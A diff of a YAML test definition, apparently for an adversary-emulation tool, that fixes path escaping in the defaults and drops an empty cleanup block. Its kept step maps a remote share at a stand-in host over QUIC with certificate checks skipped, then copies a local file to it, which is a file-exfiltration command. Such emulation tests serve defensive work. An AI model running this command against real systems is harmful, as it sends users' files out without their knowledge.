@@ -9,10 +9,10 @@ description: |
 args:
     - name: remote_path
       type: string
-      default: \\example.com\sales
+      default: \\\\example.com\\sales
     - name: local_file
       type: path
-      default: C:\path\to\file.txt
+      default: C:\\path\\to\\file.txt
 uuid: 183235ca-8e6c-422c-88c2-3aa28c4825d9
 mitre:
     tactics:
@@ -29,6 +29,3 @@ steps:
         NET USE * '{{.Args.remote_path}}' /TRANSPORT:QUIC /SKIPCERTCHECK
         copy '{{.Args.local_file}}' '*:\'
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
